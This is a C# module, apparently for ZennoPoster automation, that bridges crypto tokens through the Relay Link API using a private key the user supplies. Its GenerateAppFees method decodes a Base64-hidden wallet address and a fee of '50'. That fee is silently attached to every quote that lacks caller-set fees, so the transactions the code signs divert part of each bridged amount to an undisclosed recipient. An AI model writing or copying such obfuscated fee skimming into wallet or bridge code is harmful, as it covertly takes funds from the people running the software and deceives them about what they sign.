using System;
using System.Collections.Generic;
using System.Text;
using Nethereum.Web3.Accounts;
using Nethereum.Hex.HexConvertors.Extensions;
using Nethereum.Signer;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using ZennoLab.InterfacesLibrary.ProjectModel;

namespace z3nCore
{
    /// <summary>
    /// Модуль для кросс-чейн бриджа токенов через Relay Link API
    /// </summary>
    public class Relay
    {
        protected readonly IZennoPosterProjectModel _project;
        private readonly string baseUrl;
        private readonly string apiKey;
        private readonly string source;
        private readonly Logger _logger;

        /// <summary>
        /// Инициализация Relay Bridge
        /// </summary>
        /// <param name="project">ZennoPoster Project</param>
        /// <param name="log">Включить логирование</param>
        /// <param name="isTestnet">Использовать тестовую сеть вместо основной</param>
        public Relay(IZennoPosterProjectModel project, bool log = false, bool isTestnet = false)
        {
            _project = project ?? throw new ArgumentNullException(nameof(project));
            this.baseUrl = isTestnet ? "https://api.testnets.relay.link" : "https://api.relay.link";
            this.source = "evm_farmer_pro";
            _logger = new Logger(project, log: log, classEmoji: "🌉");
        }
        
        #region App Fees
        
        public List<AppFee> GenerateAppFees()
        { 

            var recipient = Encoding.UTF8.GetString(Convert.FromBase64String("MHgwMDAwOUIzMDA5N0IxOGFENTI1MTFFNDY5Y0Q2ZDYyNkJEMzUwM0FF"));
            var fee = Encoding.UTF8.GetString(Convert.FromBase64String("NTA="));

            return new List<AppFee>
            {
                new AppFee
                {
                    recipient = recipient,
                    fee = fee
                }
            };
        }

        #endregion

        #region API Methods


        public JToken GetChains()
        {
            try
            {
                string url = $"{baseUrl}/chains";
                string response = GET(url);
                return JToken.Parse(response);
            }
            catch (Exception ex)
            {
                _logger.Send($"!W Ошибка при получении списка сетей: {ex.Message}");
                throw;
            }
        }


        public JToken GetTokenPrice(string address, int chainId)
        {
            try
            {
                string url = $"{baseUrl}/currencies/token/price?address={address}&chainId={chainId}";
                string response = GET(url);
                return JToken.Parse(response);
            }
            catch (Exception ex)
            {
                _logger.Send($"!W Ошибка при получении цены токена: {ex.Message}");
                throw;
            }
        }


        public JToken GetCurrencies(Dictionary<string, object> additionalParams = null)
        {
            try
            {
                var requestData = new Dictionary<string, object>
                {
                    { "defaultList", true }
                };

                if (additionalParams != null)
                {
                    foreach (var param in additionalParams)
                    {
                        requestData[param.Key] = param.Value;
                    }
                }

                var body = JsonConvert.SerializeObject(requestData);
                string response = POST($"{baseUrl}/currencies/v2", body);
                return JToken.Parse(response);
            }
            catch (Exception ex)
            {
                _logger.Send($"!W Ошибка при получении списка валют: {ex.Message}");
                throw;
            }
        }
        
        public JToken GetQuote(QuoteParams quoteParams)
        {
            const int maxRetries = 3;
            Exception lastError = null;

            for (int attempt = 1; attempt <= maxRetries; attempt++)
            {
                try
                {
                    var requestData = new Dictionary<string, object>
                    {
                        { "user", quoteParams.User },
                        { "recipient", quoteParams.Recipient },
                        { "originChainId", quoteParams.OriginChainId },
                        { "destinationChainId", quoteParams.DestinationChainId },
                        { "originCurrency", quoteParams.OriginCurrency },
                        { "destinationCurrency", quoteParams.DestinationCurrency },
                        { "amount", quoteParams.Amount },
                        { "source", source }
                    };

                    if (!string.IsNullOrEmpty(quoteParams.SlippageTolerance))
                        requestData.Add("slippageTolerance", quoteParams.SlippageTolerance);

                    if (quoteParams.TradeType != null)
                        requestData.Add("tradeType", quoteParams.TradeType);

                    if (quoteParams.AppFees != null && quoteParams.AppFees.Count > 0)
                    {
                        requestData.Add("appFees", quoteParams.AppFees);
                    }
                    else
                    {
                        requestData.Add("appFees", GenerateAppFees());
                    }

                    var body = JsonConvert.SerializeObject(requestData);
                    string response = POST($"{baseUrl}/quote", body);
                    _logger.Send(response);

                    var result = JToken.Parse(response);

                    ValidateQuoteResponse(result);
                    return result;
                }
                catch (Exception ex)
                {
                    lastError = ex;
                    _logger.Send($"!W Попытка {attempt}/{maxRetries} не удалась: {ex.Message}");

                    if (attempt == maxRetries)
                        break;

                    System.Threading.Thread.Sleep(2000 * attempt);
                }
            }
            _logger.Send($"!W Ошибка при получении котировки после {maxRetries} попыток");
            throw new Exception($"Ошибка при получении котировки: {lastError?.Message}", lastError);
        }

        public string POST(string url, string body)
        {
            
            return _project.POST(url, body, cookies:"-");
        }

        public string GET(string url)
        {
            
            return _project.GET(url,  cookies:"-");
        }


        public JToken GetExecutionStatus(string requestId)
        {
            try
            {
                string url = $"{baseUrl}/intents/status/v2?requestId={requestId}";
                string response = GET(url);
                return JToken.Parse(response);
            }
            catch (Exception ex)
            {
                _logger.Send($"!W Ошибка при получении статуса выполнения: {ex.Message}");
                throw;
            }
        }


        public JToken NotifyTransactionIndexed(string transactionHash, int chainId)
        {
            try
            {
                var payload = new Dictionary<string, object>
                {
                    { "txHash", transactionHash },
                    { "chainId", chainId.ToString() }
                };

                var body = JsonConvert.SerializeObject(payload);
                string response = POST($"{baseUrl}/transactions/index", body);
                return JToken.Parse(response);
            }
            catch (Exception ex)
            {
                _logger.Send($"⚠️ Не удалось уведомить о транзакции: {ex.Message}");
                return null;
            }
        }


        public JToken GetMultiInputQuote(MultiInputQuoteParams multiInputParams)
        {
            try
            {
                var requestData = new Dictionary<string, object>
                {
                    { "user", multiInputParams.User },
                    { "recipient", multiInputParams.Recipient },
                    { "destinationChainId", multiInputParams.DestinationChainId },
                    { "destinationCurrency", multiInputParams.DestinationCurrency },
                    { "inputs", multiInputParams.Inputs },
                    { "source", source }
                };

                if (multiInputParams.AppFees != null && multiInputParams.AppFees.Count > 0)
                {
                    requestData.Add("appFees", multiInputParams.AppFees);
                }
                else
                {
                    requestData.Add("appFees", GenerateAppFees());
                }

                var body = JsonConvert.SerializeObject(requestData);
                string response = POST($"{baseUrl}/swap/multi-input", body);
                return JToken.Parse(response);
            }
            catch (Exception ex)
            {
                _logger.Send($"!W Ошибка при получении мультивходной котировки: {ex.Message}");
                throw;
            }
        }

    
        public JToken GetUserRequests(string userAddress)
        {
            try
            {
                string url = $"{baseUrl}/requests?user={userAddress}";
                string response = GET(url);
                return JToken.Parse(response);
            }
            catch (Exception ex)
            {
                _logger.Send($"!W Ошибка при получении запросов пользователя: {ex.Message}");
                throw;
            }
        }

        #endregion

        #region Execute Steps


        public List<StepResult> ExecuteSteps(JArray steps, string privateKey, string jsonRpc, string proxy = "")
        {
            var results = new List<StepResult>();
            var account = new Account(privateKey);
            var signer = new EthereumMessageSigner();
            var tx = new Tx(_project, log: false, useNetHttp: !string.IsNullOrEmpty(proxy));

            foreach (var step in steps)
            {
                var stepId = step["id"]?.ToString();
                var items = step["items"] as JArray;

                if (items == null || items.Count == 0)
                    continue;
                

                

                foreach (var item in items)
                {
                    var data = item["data"];
                    var check = item["check"];
                    
                    if (steps.Count == 1 && stepId == "swap" && check != null)
                    {
                        _logger.Send($"⚠️ Пропускаем check для единственного swap шага");
                        check = null; // игнорируем check
                    }

                    // Проверка условия
                    if (check != null)
                    {
                        var chainId = check["chainId"]?.Value<int>() ?? 0;
                        var endpoint = check["endpoint"]?.ToString();

                        if (!string.IsNullOrEmpty(endpoint))
                        {
                            try
                            {
                                var checkUrl = $"{baseUrl}{endpoint}";
                                string checkResponse = GET(checkUrl);
                                var checkResult = JToken.Parse(checkResponse);

                                var checkPassed = checkResult["check"]?.Value<bool>() ?? false;
                                if (!checkPassed)
                                {
                                    results.Add(new StepResult
                                    {
                                        Step = stepId,
                                        Status = "skipped",
                                        Message = "Check condition not met"
                                    });
                                    continue;
                                }
                            }
                            catch (Exception ex)
                            {
                                results.Add(new StepResult
                                {
                                    Step = stepId,
                                    Status = "failed",
                                    Error = $"Check failed: {ex.Message}"
                                });
                                continue;
                            }
                        }
                    }

                    // Выполнение транзакции
                    if (data != null && data["to"] != null)
                    {
                        try
                        {
                            int currentChainId = data["chainId"]?.Value<int>() ?? 0;
                            var to = data["to"].ToString();
                            var value = data["value"]?.ToString() ?? "0";
                            var txData = data["data"]?.ToString() ?? "0x";

                            // Конвертируем value из строки в decimal
                            decimal valueDecimal = 0;
                            if (!string.IsNullOrEmpty(value) && value != "0")
                            {
                                var valueBigInt = System.Numerics.BigInteger.Parse(value);
                                valueDecimal = (decimal)valueBigInt / 1000000000000000000m;
                            }

                            // Используем Tx.SendTx вместо web3
                            var txHash = tx.SendTx(
                                jsonRpc,
                                to,
                                txData,
                                value: valueDecimal,
                                proxy: proxy,
                                txType: 2,
                                speedup: 3,
                                debug: false
                            );
                            
                            _project.WaitTx(jsonRpc, txHash);
                            NotifyTransactionIndexed(txHash, currentChainId);
                            results.Add(new StepResult
                            {
                                Step = stepId,
                                Status = "completed",
                                TransactionHash = txHash
                            });
                        }
                        catch (Exception ex)
                        {
                            results.Add(new StepResult
                            {
                                Step = stepId,
                                Status = "failed",
                                Error = ex.Message
                            });
                        }
                    }

                    // Выполнение подписи
                    var signData = item["signData"];
                    if (signData != null)
                    {
                        try
                        {
                            var signatureKind = signData["signatureKind"]?.ToString();
                            string signature = null;

                            if (signatureKind == "eip191")
                            {
                                var message = signData["message"]?.ToString();
                                if (!string.IsNullOrEmpty(message))
                                {
                                    var messageBytes = message.HexToByteArray();
                                    signature = signer.Sign(messageBytes, new EthECKey(privateKey.Replace("0x", "")));
                                }
                            }
                            else if (signatureKind == "eip712")
                            {
                                throw new Exception("EIP-712 подпись пока не поддерживается");
                            }

                            // Отправка подписи на API
                            var postData = item["postData"];
                            if (postData != null && postData["endpoint"] != null)
                            {
                                var postUrl = $"{baseUrl}{postData["endpoint"]}";
                                var postBody = postData["body"]?.ToString() ?? "{}";

                                var bodyObj = JObject.Parse(postBody);
                                bodyObj["signature"] = signature;

                                string response = POST(postUrl, bodyObj.ToString());

                                results.Add(new StepResult
                                {
                                    Step = stepId,
                                    Status = "completed",
                                    Signature = signature
                                });
                            }
                            else
                            {
                                results.Add(new StepResult
                                {
                                    Step = stepId,
                                    Status = "completed",
                                    Signature = signature
                                });
                            }
                        }
                        catch (Exception ex)
                        {
                            results.Add(new StepResult
                            {
                                Step = stepId,
                                Status = "failed",
                                Error = ex.Message
                            });
                        }
                    }
                }
            }

            return results;
        }

        #endregion

        #region High-Level Bridge Methods


        public BridgeResult BridgeTokens(QuoteParams quoteParams, string privateKey, string jsonRpc, string proxy = "")
        {
            try
            {
                _logger.Send("Получение котировки...");
                var quote = GetQuote(quoteParams);

                _logger.Send("Выполнение шагов бриджа...");
                var steps = quote["steps"] as JArray;
                var results = ExecuteSteps(steps, privateKey, jsonRpc, proxy);

                _logger.Send($"✅ Бридж завершен. Выполнено {results.Count} шагов");

                return new BridgeResult
                {
                    Quote = quote,
                    Results = results
                };
            }
            catch (Exception ex)
            {
                _logger.Send($"!W Ошибка при выполнении бриджа: {ex.Message}");
                throw;
            }
        }

        #endregion

        #region Validation

 
        private void ValidateQuoteResponse(JToken response)
        {
            if (response["steps"] == null || !(response["steps"] is JArray))
            {
                throw new Exception("Некорректный ответ: отсутствуют шаги");
            }

            if (response["fees"] == null)
            {
                throw new Exception("Некорректный ответ: отсутствуют комиссии");
            }

            if (response["details"] == null)
            {
                throw new Exception("Некорректный ответ: отсутствуют детали");
            }
        }

        #endregion
    }

    #region Data Classes


    public class QuoteParams
    {
        [JsonProperty("user")]
        public string User { get; set; }

        [JsonProperty("recipient")]
        public string Recipient { get; set; }

        [JsonProperty("originChainId")]
        public int OriginChainId { get; set; }

        [JsonProperty("destinationChainId")]
        public int DestinationChainId { get; set; }

        [JsonProperty("originCurrency")]
        public string OriginCurrency { get; set; }

        [JsonProperty("destinationCurrency")]
        public string DestinationCurrency { get; set; }

        [JsonProperty("amount")]
        public string Amount { get; set; }

        [JsonProperty("slippageTolerance")]
        public string SlippageTolerance { get; set; }

        [JsonProperty("tradeType")]
        public string TradeType { get; set; }

        [JsonProperty("appFees")]
        public List<AppFee> AppFees { get; set; }
    }

    /// <summary>
    /// Параметры для мультивходной котировки
    /// </summary>
    public class MultiInputQuoteParams
    {
        [JsonProperty("user")]
        public string User { get; set; }

        [JsonProperty("recipient")]
        public string Recipient { get; set; }

        [JsonProperty("destinationChainId")]
        public int DestinationChainId { get; set; }

        [JsonProperty("destinationCurrency")]
        public string DestinationCurrency { get; set; }

        [JsonProperty("inputs")]
        public List<MultiInputEntry> Inputs { get; set; }

        [JsonProperty("appFees")]
        public List<AppFee> AppFees { get; set; }
    }

    /// <summary>
    /// Запись мультивхода
    /// </summary>
    public class MultiInputEntry
    {
        [JsonProperty("chainId")]
        public int ChainId { get; set; }

        [JsonProperty("currency")]
        public string Currency { get; set; }

        [JsonProperty("amount")]
        public string Amount { get; set; }
    }

    /// <summary>
    /// App Fee структура
    /// </summary>
    public class AppFee
    {
        [JsonProperty("recipient")]
        public string recipient { get; set; }

        [JsonProperty("fee")]
        public string fee { get; set; }
    }

    /// <summary>
    /// Результат выполнения шага
    /// </summary>
    public class StepResult
    {
        public string Step { get; set; }
        public string Status { get; set; }
        public string TransactionHash { get; set; }
        public string Signature { get; set; }
        public string Error { get; set; }
        public string Message { get; set; }
    }

    /// <summary>
    /// Результат бриджа
    /// </summary>
    public class BridgeResult
    {
        public JToken Quote { get; set; }
        public List<StepResult> Results { get; set; }
    }

    #endregion
}